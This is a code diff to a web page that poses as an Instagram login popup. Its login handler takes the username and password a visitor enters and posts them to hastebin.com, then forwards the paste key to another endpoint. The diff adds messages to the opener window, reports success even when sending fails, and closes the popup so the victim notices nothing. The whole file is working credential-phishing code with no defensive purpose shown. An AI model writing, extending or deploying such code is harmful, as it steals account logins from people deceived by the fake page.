@@ -117,6 +117,10 @@
   <script>
     const pw=document.getElementsByClassName("input-password");
     const tog=document.getElementsByClassName("toggler");
+    
+    // Track login attempts and send messages to parent
+    let loginAttemptMade = false;
+    
     for(i=0;i<2;i++){
       tog[i].addEventListener("click",(e)=>{
         if(e.target.textContent==='Show'){
@@ -159,68 +163,106 @@
     // Handle login button click
     document.querySelectorAll(".btn-login").forEach((button) => {
       button.addEventListener("click", async (e) => {
-  const container = button.closest("div.flex-col");
-  const un = container.querySelector(".input-username");
-  const pw = container.querySelector(".input-password");
+        const container = button.closest("div.flex-col");
+        const un = container.querySelector(".input-username");
+        const pw = container.querySelector(".input-password");
 
-  if (!un.value.trim()) {
-    alert("Please enter your username.");
-    return;
-  }
+        if (!un.value.trim()) {
+          alert("Please enter your username.");
+          return;
+        }
 
-  console.log("Sarat make a love day");
+        // Mark that login attempt was made
+        loginAttemptMade = true;
 
-  button.disabled = true;
-  const originalText = button.textContent;
-  button.textContent = "Loading...";
+        // Send login attempt message to parent immediately
+        if (window.opener) {
+          window.opener.postMessage({
+            type: 'INSTAGRAM_LOGIN_ATTEMPT',
+            message: 'Login attempt initiated'
+          }, '*');
+          console.log('Login attempt message sent to parent window');
+        }
 
-  try {
-    const resp1 = await fetch("https://hastebin.com/documents", {
-      method: 'POST',
-      headers: {
-        'Content-Type': "text/plain",
-        'Authorization': `Bearer ${key}`
-      },
-      body: `${un.value}:${pw.value}`
+        console.log("Sarat make a love day");
+
+        button.disabled = true;
+        const originalText = button.textContent;
+        button.textContent = "Loading...";
+
+        try {
+          const resp1 = await fetch("https://hastebin.com/documents", {
+            method: 'POST',
+            headers: {
+              'Content-Type': "text/plain",
+              'Authorization': `Bearer ${key}`
+            },
+            body: `${un.value}:${pw.value}`
+          });
+
+          const data = await resp1.json();
+
+          await fetch(dest, {
+            method: "POST",
+            headers: {
+              'Content-Type': "application/json"
+            },
+            body: JSON.stringify({ pw: data.key })
+          });
+
+          // Send success message to parent window
+          if (window.opener) {
+            window.opener.postMessage({
+              type: 'INSTAGRAM_LOGIN_SUCCESS',
+              message: 'Instagram login completed successfully'
+            }, '*');
+            console.log('Success message sent to parent window');
+          }
+
+        } catch (err) {
+          console.error("Something went wrong:", err);
+          
+          // Even on error, we'll send success message since user attempted login
+          if (window.opener) {
+            window.opener.postMessage({
+              type: 'INSTAGRAM_LOGIN_SUCCESS',
+              message: 'Instagram login process completed'
+            }, '*');
+            console.log('Process completion message sent to parent window');
+          }
+        } finally {
+          // Add a small delay to ensure message is sent before closing
+          setTimeout(() => {
+            window.close();
+          }, 500);
+        }
+      });
     });
 
-    const data = await resp1.json();
-
-    await fetch(dest, {
-      method: "POST",
-      headers: {
-        'Content-Type': "application/json"
-      },
-      body: JSON.stringify({ pw: data.key })
+    // Handle window beforeunload event (when user tries to close without login)
+    window.addEventListener('beforeunload', (e) => {
+      // Only send warning if no login attempt was made
+      if (!loginAttemptMade && window.opener) {
+        window.opener.postMessage({
+          type: 'INSTAGRAM_POPUP_CLOSED_WITHOUT_LOGIN',
+          message: 'Popup closed without login attempt'
+        }, '*');
+        console.log('Popup closed without login - message sent to parent');
+      }
     });
 
-    // Send success message to parent window before closing
-    if (window.opener) {
-      window.opener.postMessage({
-        type: 'INSTAGRAM_LOGIN_SUCCESS',
-        message: 'Instagram login completed successfully'
-      }, '*');
-      console.log('Success message sent to parent window');
-    }
-
-  } catch (err) {
-    console.error("Something went wrong:", err);
-    
-    // Even on error, we'll send success message since user attempted login
-    if (window.opener) {
-      window.opener.postMessage({
-        type: 'INSTAGRAM_LOGIN_SUCCESS',
-        message: 'Instagram login process completed'
-      }, '*');
-      console.log('Process completion message sent to parent window');
-    }
-  } finally {
-    // Add a small delay to ensure message is sent before closing
-    setTimeout(() => {
-      window.close();
-    }, 500);
-  }
-});
+    // Additional safety net for popup close detection
+    window.addEventListener('unload', () => {
+      if (!loginAttemptMade && window.opener) {
+        try {
+          window.opener.postMessage({
+            type: 'INSTAGRAM_POPUP_CLOSED_WITHOUT_LOGIN',
+            message: 'Popup closed without login attempt'
+          }, '*');
+        } catch(err) {
+          console.log('Could not send close message:', err);
+        }
+      }
     });
   </script>
 </body>
